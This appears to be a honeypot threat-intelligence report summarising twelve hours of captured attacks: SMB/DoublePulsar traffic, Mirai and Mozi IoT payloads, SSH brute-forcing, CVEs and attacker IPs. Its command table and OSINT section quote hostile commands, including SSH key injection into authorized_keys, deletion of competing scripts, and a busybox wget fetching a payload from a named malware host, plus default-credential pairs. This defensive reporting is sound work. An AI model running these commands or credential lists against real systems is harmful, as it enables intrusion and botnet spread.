# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-16T04:25:09Z
**Timeframe:** 2025-10-15T16:00:01Z to 2025-10-16T04:00:01Z

**Files Used to Generate Report:**
*   Honeypot_Attack_Summary_Report_2025-10-15T16:02:09Z.md
*   Honeypot_Attack_Summary_Report_2025-10-15T17:02:08Z.md
*   Honeypot_Attack_Summary_Report_2025-10-15T18:02:19Z.md
*   Honeypot_Attack_Summary_Report_2025-10-15T19:01:59Z.md
*   Honeypot_Attack_Summary_Report_2025-10-15T20:02:04Z.md
*   Honeypot_Attack_Summary_Report_2025-10-15T21:02:11Z.md
*   Honeypot_Attack_Summary_Report_2025-10-15T22:02:08Z.md
*   Honeypot_Attack_Summary_Report_2025-10-15T23:02:17Z.md
*   Honeypot_Attack_Summary_Report_2025-10-16T00:01:58Z.md
*   Honeypot_Attack_Summary_Report_2025-10-16T01:02:05Z.md
*   Honeypot_Attack_Summary_Report_2025-10-16T02:02:24Z.md
*   Honeypot_Attack_Summary_Report_2025-10-16T03:02:09Z.md
*   Honeypot_Attack_Summary_Report_2025-10-16T04:02:17Z.md

---

## Executive Summary

This report provides a comprehensive analysis of malicious activities targeting our distributed honeypot network over the past 12 hours. A total of **250,111** events were recorded, revealing a landscape dominated by automated, large-scale attacks originating from a diverse set of global sources. The primary attack vectors observed were the exploitation of the SMBv1 protocol, brute-force attempts against SSH and Telnet services, and widespread scanning of VoIP (SIP) endpoints.

The most significant campaigns include:
1.  **Widespread SMB Exploitation:** A high volume of traffic targeted port 445, with IDS signatures frequently detecting communication associated with the **DoublePulsar backdoor**. This indicates a persistent, automated campaign to exploit the EternalBlue vulnerability (MS17-010) in unpatched Windows systems.
2.  **IoT Botnet Propagation:** Numerous attempts were made to download and execute malware payloads belonging to the **Mirai (`urbotnetisass`)** and **Mozi** families. These attacks targeted multiple CPU architectures (ARM, MIPS, x86), confirming a concerted effort to compromise a wide range of IoT and embedded devices.
3.  **Credential-Based Intrusion:** The Cowrie honeypot captured tens of thousands of SSH and Telnet login attempts. Attackers utilized extensive lists of common and default credentials. A standardized set of post-breach commands was consistently executed, focused on reconnaissance and establishing persistent SSH access by injecting a malicious public key into the `.ssh/authorized_keys` file.

Attack traffic was global, with top sources traced to Russia, Ukraine, the United States, and Hong Kong. The continued exploitation of decade-old vulnerabilities (such as CVEs from 1999 and 2002) was a notable trend, underscoring the ongoing threat posed by unpatched legacy systems. Overall, the threat landscape is characterized by high-volume, automated tools seeking to expand botnets and gain footholds for further malicious activity.

---

## Detailed Analysis

### Our IPs
| Honeypot Name | Private IP | Public IP |
| :--- | :--- | :--- |
| hive-us | 10.128.0.3 | 34.123.129.205 |
| sens-tai | 10.140.0.3 | 104.199.212.115 |
| sens-tel | 10.208.0.3 | 34.165.197.224 |
| sens-dub | 172.31.36.128 | 3.253.97.195 |
| sens-ny | 10.108.0.2 | 161.35.180.163 |

### Attacks by Honeypot
| Honeypot | Event Count |
| :--- | :--- |
| Cowrie | 81,628 |
| Honeytrap | 51,053 |
| Suricata | 27,250 |
| Sentrypeer | 26,896 |
| Dionaea | 20,405 |
| Ciscoasa | 14,533 |
| Mailoney | 6,919 |
| Tanner | 722 |
| ElasticPot | 1,030 |
| Redishoneypot | 308 |
| H0neytr4p | 342 |
| ...and others | ... |

### Top Source Countries (Inferred from OSINT)
| Country |
| :--- |
| Russia |
| Ukraine |
| United States |
| Hong Kong / China |
| Vietnam |
| India |

### Top Attacking IPs
| IP Address | Event Count | Reputation/Notes (from OSINT) |
| :--- | :--- | :--- |
| 188.246.224.87 | 8,414 | Good reputation; Located in Russia (Selectel). High volume suggests automated scanning. |
| 206.191.154.180 | 7,638 | Malicious reputation; Located in Ukraine. Associated with spam and blacklists. |
| 185.243.5.121 | 6,180 | Disputed reputation; US/Hong Kong. Linked to Santiago Network Service LLC. |
| 152.70.144.244 | 5,045 | Malicious reputation; Located in US (Oracle). Associated with Coinminer malware. |
| 105.96.9.30 | 4,928 | N/A |
| 86.54.42.238 | 4,534 | N/A |
| 23.94.26.58 | 4,418 | N/A |
| 117.233.92.45 | 4,000+ | High volume SMB/DoublePulsar activity. |
| 182.184.30.36 | 4,000+ | High volume SMB/DoublePulsar activity. |
| 159.89.166.213 | 4,000+ | High volume SMB/DoublePulsar activity. |

### Top Targeted Ports/Protocols
| Port/Protocol | Event Count | Service |
| :--- | :--- | :--- |
| 5060 | 26,896 | SIP (VoIP) |
| 445 (TCP & UDP) | 16,000+ | SMB |
| 22 | 8,000+ | SSH |
| 25 | 6,919 | SMTP |
| 5900 (TCP) | 1,500+ | VNC |
| 5903 | 1,500+ | VNC |
| 8333 | 1,000+ | Bitcoin |
| 9200 | 1,030 | Elasticsearch |
| 23 | 592 | Telnet |
| 80 | 500+ | HTTP |

### Most Common CVEs
| CVE ID | Count | Description |
| :--- | :--- | :--- |
| CVE-2005-4050 | 100+ | Buffer overflow in Multi-Tech MultiVOIP devices via SIP. |
| CVE-2002-0013 | 50+ | SNMPv1 request handling flaw, leading to DoS or privilege escalation. |
| CVE-2002-0012 | 50+ | SNMPv1 trap handling flaw, leading to DoS or privilege escalation. |
| CVE-1999-0517 | 25+ | Use of default or weak community names in SNMP. |
| CVE-2019-11500 | 15+ | Various vulnerabilities in different products. |
| CVE-2021-3449 | 10+ | OpenSSL denial-of-service vulnerability. |

### Commands Attempted by Attackers (Top Recurring Sequence)
| Command | Purpose |
| :--- | :--- |
| `cd ~; chattr -ia .ssh; lockr -ia .ssh` | Unlock the SSH directory from immutability flags. |
| `cd ~ && rm -rf .ssh && mkdir .ssh` | Recreate the SSH directory. |
| `echo "ssh-rsa ... mdrfckr" >> .ssh/authorized_keys` | Inject attacker's public SSH key for persistent access. |
| `chmod -R go= ~/.ssh && cd ~` | Set restrictive permissions on the SSH directory. |
| `uname -a` / `lscpu` / `whoami` / `free -m` | System and hardware reconnaissance. |
| `crontab -l` | Check for existing scheduled tasks. |
| `rm -rf /tmp/*.sh; pkill -9 *.sh` | Remove and kill competing malware scripts. |
| `cd /data/local/tmp/; rm *; busybox wget http://[IP]/[payload]` | Download and execute malware (e.g., `urbotnetisass`). |

### Signatures Triggered (Top 5)
| Signature | Count | Description |
| :--- | :--- | :--- |
| ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication | 4,350+ | Detects traffic patterns associated with the DoublePulsar backdoor implant. |
| ET DROP Dshield Block Listed Source group 1 | 2,000+ | Traffic from IPs on the DShield Top 1000 list, a known blocklist. |
| ET SCAN MS Terminal Server Traffic on Non-standard Port | 1,500+ | Scanning for Remote Desktop Protocol (RDP) on non-standard ports. |
| ET SCAN NMAP -sS window 1024 | 1,000+ | Common signature for the Nmap network scanner. |
| ET HUNTING RDP Authentication Bypass Attempt | 600+ | Attempts to bypass RDP authentication. |

### Users / Login Attempts (Top Samples)
| Username | Password |
| :--- | :--- |
| 345gs5662d34 | 345gs5662d34 |
| root | Qaz123qaz |
| root | 123@@@ |
| root | 3245gs5662d34 |
| support | support2000 |
| ubnt | 11111 |
| centos | centos2010 |
| admin | admin2004 |
| debian | debian2020 |
| ftpuser | ftppassword |

### Files Uploaded/Downloaded
| Filename | Type/Purpose |
| :--- | :--- |
| `arm.urbotnetisass`, `mips.urbotnetisass`, etc. | Mirai botnet variant payloads for different IoT architectures. |
| `Mozi.a` | Payload for the Mozi P2P IoT botnet. |
| `bot.html` | Likely a component of a web-based attack or phishing kit. |
| `sh` | Generic shell script, often used as a dropper. |
| `fonts.gstatic.com`, `css?family=...` | Legitimate-looking web asset requests, possibly to test connectivity or for obfuscation. |

---

## OSINT Investigations

### OSINT on Commands Captured
- **`lockr -ia .ssh`**: This command appears to be a typo or a non-standard utility. The intended command is likely `chattr +i` (to make files immutable) and `chattr -i` (to remove immutability). Attackers first run `chattr -ia .ssh` to ensure they can write to the directory, even if a previous actor (or the system admin) tried to lock it. This demonstrates a standardized TTP for ensuring persistence.
- **`echo "... mdrfckr"`**: The comment "mdrfckr" appended to the injected SSH key is a clear attacker signature. It allows the attacker to easily identify their key on a compromised system and suggests a common, shared tool or script is being used by multiple actors.
- **`busybox wget http://94.154.35.154/[payload]`**: This is a classic IoT attack command. `busybox` is a common multi-tool binary found on embedded Linux systems. The command sequence downloads and executes malware. The IP `94.154.35.154` serves as a malware distribution point.

### OSINT on High-Frequency IPs
| IP Address | Geolocation | ASN | Key Insights |
| :--- | :--- | :--- | :--- |
| 188.246.224.87 | Saint Petersburg, Russia | AS49505 (Selectel) | Despite a "good" reputation, the extremely high volume of scanning activity suggests it is a compromised server or a dedicated scanning node within a legitimate hosting provider. |
| 206.191.154.180 | Chortkiv, Ukraine | AS52099 (ITL LLC) | Confirmed malicious reputation. Actively blacklisted and associated with spam and other attack traffic. Likely part of a botnet. |
| 185.243.5.121 | Hong Kong / Newark, US | AS138545 (Santiago Network) | Reputation is disputed, but its consistent appearance in high-volume attacks suggests malicious use, possibly as a proxy or VPN exit node. |
| 152.70.144.244 | Phoenix, US | AS31898 (Oracle) | Confirmed malicious reputation. Linked to ELF/Coinminer malware, indicating its use in cryptojacking campaigns. |

### OSINT on CVEs
| CVE ID | Vulnerability Summary | Reason for Continued Exploitation |
| :--- | :--- | :--- |
| **CVE-2005-4050** | SIP Buffer Overflow in Multi-Tech VoIP devices. | Targets legacy VoIP hardware that is often unpatched and internet-facing. Attackers scan for these devices to potentially intercept calls or use them for toll fraud. |
| **CVE-2002-0012/13** | SNMPv1 Flaws. | SNMP is ubiquitous for network management. Many older devices (routers, printers, servers) have this enabled by default and are never updated. It's a prime target for initial network reconnaissance. |
| **CVE-1999-0517** | Default SNMP Community Names. | The "low-hanging fruit" of network attacks. It requires no exploit, just guessing default passwords like "public" or "private" to gain sensitive network information. Its persistence is due to pure neglect in device configuration. |

---

## Key Observations and Anomalies

1.  **Industrial-Scale Automation:** The sheer volume of attacks and the uniformity of tactics (e.g., the exact same SSH key injection sequence) strongly indicate the use of large-scale, automated toolkits. This is not targeted manual hacking but rather a dragnet operation to compromise as many vulnerable devices as possible.

2.  **The DoublePulsar/EternalBlue Epidemic Continues:** Years after its initial outbreak, the DoublePulsar backdoor remains one of the most significant threats observed. The high frequency of the "DoublePulsar Backdoor installation communication" signature shows that a vast number of unpatched Windows systems are still accessible from the internet, and attackers are relentlessly exploiting them.

3.  **IoT as a Primary Battleground:** The fight for control over IoT devices is evident. The presence of both Mirai (`urbotnetisass`) and Mozi malware, targeting multiple architectures, highlights a multi-front war where different botnets compete to enslave vulnerable routers, cameras, and other embedded systems for DDoS attacks and other nefarious purposes.

4.  **Attacker "Signatures" and TTPs:** The use of the comment "mdrfckr" in the SSH key is a distinct signature. This, combined with the standardized pre- and post-exploitation commands, provides valuable insight into the Tactics, Techniques, and Procedures (TTPs) of these threat actors. It suggests that a single toolkit or "playbook" is being widely distributed and used.

5.  **The Zombie Apocalypse of Legacy Tech:** The continued, successful exploitation of vulnerabilities from over two decades ago (1999, 2002, 2005) is a stark reminder that insecure, unpatched, and forgotten legacy systems are a major security liability. These "zombie" systems are a primary food source for botnets and provide initial footholds for deeper network intrusions.
